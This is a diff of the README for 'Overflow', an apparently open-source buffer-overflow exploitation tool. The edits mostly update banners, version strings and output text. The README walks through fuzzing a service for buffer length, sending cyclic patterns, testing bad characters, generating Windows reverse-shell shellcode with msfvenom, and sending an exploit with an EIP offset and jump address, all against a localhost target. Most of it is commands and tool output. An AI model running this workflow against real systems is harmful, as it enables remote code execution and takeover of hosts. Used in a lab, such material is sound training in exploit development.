@@ -91,11 +91,11 @@ $ overflow fuzz -H 127.0.0.1 -P 4444 -S 100
  | |  | \ \ / / _ \ '__|  _| |/ _ \ \ /\ / /
  | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
   \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
-  
- Overflow v0.1
- by Stephen Radley (github.com/sradley)
+
+ Overflow v0.1.0
+  by Stephen Radley           github.com/sradley
 ─────────────────────────────────────────────────
- :: Mode        : fuzz 
+ :: Mode        : fuzz
  :: Host        : 127.0.0.1
  :: Port        : 4444
  :: Step        : 100
@@ -111,7 +111,7 @@ $ overflow fuzz -H 127.0.0.1 -P 4444 -S 100
  > Building payload.
  > Sending 500-byte payload.
  
- Success! Length of buffer is (400, 500].
+ Success! Length of buffer is in range (400, 500].
 ```
 
 ### Sending Cyclic Patterns
@@ -144,14 +144,15 @@ $ overflow pattern -H 127.0.0.1 -P 4444 -l 65
  | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
   \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
 
- Overflow v0.1
- by Stephen Radley (github.com/sradley)
+ Overflow v0.1.0
+  by Stephen Radley           github.com/sradley
 ─────────────────────────────────────────────────
- :: Mode        : pattern 
+ :: Mode        : pattern
  :: Host        : 127.0.0.1
  :: Port        : 4444
  :: Length      : 65
 ─────────────────────────────────────────────────
+ > Generating pattern.
  > Building payload.
  > Sending 65-byte payload.
  
@@ -194,14 +195,16 @@ $ overflow chars -H 127.0.0.1 -P 4444 -o 160
  | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
   \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
 
- Overflow v0.1
- by Stephen Radley (github.com/sradley)
+ Overflow v0.1.0
+  by Stephen Radley           github.com/sradley
 ─────────────────────────────────────────────────
- :: Mode        : chars 
+ :: Mode        : chars
  :: Host        : 127.0.0.1
  :: Port        : 4444
  :: Offset      : 160
+ :: Exclude     : ""
 ─────────────────────────────────────────────────
+ > Parsing exclusions.
  > Building payload.
  > Sending 416-byte payload. 
  
@@ -221,17 +224,16 @@ $ overflow chars -H 127.0.0.1 -P 4444 -o 160 -e "\x00\x41\xAB\x01"
  | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
   \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
 
- Overflow v0.1
- by Stephen Radley (github.com/sradley)
+ Overflow v0.1.0
+  by Stephen Radley           github.com/sradley
 ─────────────────────────────────────────────────
- :: Mode        : chars 
+ :: Mode        : chars
  :: Host        : 127.0.0.1
  :: Port        : 4444
  :: Offset      : 160
  :: Exclude     : "\x00\x41\xAB\x01"
 ─────────────────────────────────────────────────
- 2020/10/29 20:19:05 Starting overflow
-─────────────────────────────────────────────────
+ > Parsing exclusions.
  > Building payload.
  > Sending 412-byte payload. 
  
@@ -264,7 +266,7 @@ $ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4321 \
 Then just use the tool as follows, ensuring you include the offset to the EIP
 register and the jump address in the format used below.
 ```
-$ overflow -H 127.0.0.1 4444 -o 160 -j "0x5f4a358f" -S path/to/payload.shell
+$ overflow exploit -H 127.0.0.1 -P 4444 -o 160 -j "0x5f4a358f" -S path/to/payload.shell
 ```
 ```
    ____                  __ _               
@@ -274,16 +276,17 @@ $ overflow -H 127.0.0.1 4444 -o 160 -j "0x5f4a358f" -S path/to/payload.shell
  | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
   \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
 
- Overflow v0.1
- by Stephen Radley (github.com/sradley)
+ Overflow v0.1.0
+  by Stephen Radley           github.com/sradley
 ─────────────────────────────────────────────────
- :: Mode        : exploit 
+ :: Mode        : exploit
  :: Host        : 127.0.0.1
  :: Port        : 4444
  :: Offset      : 160
  :: Jump        : "0x5f4a358f"
  :: Shell       : path/to/payload.shell
 ─────────────────────────────────────────────────
+ > Reading shellcode.
  > Building payload.
  > Sending 531-byte payload. 
  
